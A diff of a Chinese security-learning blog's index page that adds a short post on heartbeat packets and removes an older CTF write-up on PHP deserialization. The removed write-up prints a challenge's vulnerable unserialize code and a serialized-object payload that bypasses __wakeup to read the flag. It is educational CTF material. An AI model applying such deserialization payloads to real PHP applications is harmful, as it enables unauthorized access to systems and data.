@@ -205,6 +205,80 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="记录学习路上的一些东西">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/" class="post-title-link" itemprop="url">今日渗透的知识（心跳包 访问不了的域名）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">نُشر في</span>
+              
+
+              <time title="أُنشأ: 2022-02-17 17:14:36 / عُدل: 17:15:49" itemprop="dateCreated datePublished" datetime="2022-02-17T17:14:36+08:00">2022-02-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">في</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/basic/" itemprop="url" rel="index"><span itemprop="name">-basic</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="今日渗透的知识（心跳包-访问不了的域名）"><a href="#今日渗透的知识（心跳包-访问不了的域名）" class="headerlink" title="今日渗透的知识（心跳包 访问不了的域名）"></a>今日渗透的知识（心跳包 访问不了的域名）</h1><h1 id="1-心跳包"><a href="#1-心跳包" class="headerlink" title="1.心跳包"></a>1.心跳包</h1><p>今天在挖洞的时候遇到的问题，有些时候什么都没点就莫名其妙抓了个包，</p>
+<p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/blog\source_posts\今日渗透的知识（心跳包-访问不了的域名）\WPS图片编辑.png" alt="WPS图片编辑"></p>
+<p>老师告诉我这是心跳包，然后就去学习了一下</p>
+<p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/blog\source_posts\今日渗透的知识（心跳包-访问不了的域名）\image-20220217170949748.png" alt="image-20220217170949748"></p>
+<p><strong>心跳包</strong>就是在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>和<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>间定时通知对方自己状态的一个自己定义的命令字，按照一定的时间间隔发送，类似于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BF%83%E8%B7%B3/2640820">心跳</a>，所以叫做心跳包。</p>
+<h2 id="1-1-作用"><a href="#1-1-作用" class="headerlink" title="1.1 作用"></a>1.1 作用</h2><p>网络中的接收和发送数据都是使用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SOCKET/281150">SOCKET</a>进行实现，但是如果此<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%AD%97">套接字</a>已经断开，那发送数据和接收数据的时候就一定会有问题。可是如何判断这个套接字是否还可以使用呢？这个就需要在系统中创建心跳机制。其实TCP中已经为我们实现了一个叫做心跳的机制。如果你设置了心跳，那<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TCP/33012">TCP</a>就会在一定的时间（比如你设置的是3秒钟）内发送你设置的次数的心跳（比如说2次），并且此信息不会影响你自己定义的协议。所谓“心跳”就是定时发送一个自定义的结构体（心跳包或心跳帧），让对方知道自己“在线”。 以确保链接的有效性。</p>
+<h1 id="2-访问不了的域名"><a href="#2-访问不了的域名" class="headerlink" title="2. 访问不了的域名"></a>2. 访问不了的域名</h1><p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/blog\source_posts\今日渗透的知识（心跳包-访问不了的域名）\image-20220217171103673.png" alt="image-20220217171103673"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/WEB%E5%85%A5%E9%97%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1509,97 +1583,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="记录学习路上的一些东西">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/" class="post-title-link" itemprop="url">序列化与发序列化 绕过__weakup()</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">نُشر في</span>
-              
-
-              <time title="أُنشأ: 2022-01-19 15:01:42 / عُدل: 15:03:05" itemprop="dateCreated datePublished" datetime="2022-01-19T15:01:42+08:00">2022-01-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">في</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Experience/" itemprop="url" rel="index"><span itemprop="name">-Experience</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="序列化与发序列化"><a href="#序列化与发序列化" class="headerlink" title="序列化与发序列化"></a>序列化与发序列化</h1><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-1前置知识"><a href="#1-1前置知识" class="headerlink" title="1.1前置知识"></a>1.1前置知识</h2><p>反序列化的对象是类与对象</p>
-<h3 id="1-1-1常用的一些魔术方法"><a href="#1-1-1常用的一些魔术方法" class="headerlink" title="1.1.1常用的一些魔术方法"></a>1.1.1常用的一些魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__construct()//创建对象的时候使用</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-1-2相关函数"><a href="#1-1-2相关函数" class="headerlink" title="1.1.2相关函数"></a>1.1.2相关函数</h3><p><code>unserialize()</code>将传入字符串反序列化。</p>
-<p><code>serialize()</code>将传入变量序列化。</p>
-<p>与之类似于还有:<code>json_encode</code>和<code>json_decode</code></p>
-<h3 id="1-1-3序列化与反序列化"><a href="#1-1-3序列化与反序列化" class="headerlink" title="1.1.3序列化与反序列化"></a>1.1.3序列化与反序列化</h3><p>序列化是将任意类型的变量以特定的规则转换成一串字符串，可以用更少的空间保存对象里的信息，便于传输；反序列化则是根据规则还原字符串所对应的变量；</p>
-<p>如果变量类型是<code>protected</code>，则会在变量名前加上<code>%00*%00</code>,<code>private</code>则会在变量名前加上<code>%00类名%00</code>（这里不可见字符要用url编码表示）</p>
-<h3 id="1-1-4格式"><a href="#1-1-4格式" class="headerlink" title="1.1.4格式"></a>1.1.4格式</h3><p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132735454.png" alt="image-20220119132735454"></p>
-<p><img src="/2022/01/19/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%91%E5%BA%8F%E5%88%97%E5%8C%96-%E7%BB%95%E8%BF%87-weakup/image-20220119132752202.png" alt="image-20220119132752202"></p>
-<h1 id="2-常见的绕过"><a href="#2-常见的绕过" class="headerlink" title="2.常见的绕过"></a>2.常见的绕过</h1><p>[(33条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=4.16.0">CTF]PHP反序列化总结_Y4tacker的博客-CSDN博客_php反序列化</a></p>
-<h1 id="3-找点题"><a href="#3-找点题" class="headerlink" title="3.找点题"></a>3.找点题</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>访问<a target="_blank" rel="noopener" href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//class.php</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   <span class="comment">//index.php</span></span><br></pre></td></tr></table></figure>
-
-<p>index.php ，会调用class.php，以及对输入反序列化</p>
-<p>然后因为要绕过wakeup,把Name后的数字改成3.因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00</p>
-<p>最后payload:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>：&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>提交得到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1671,7 +1654,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">المقالات</span>
         </a>
       </div>
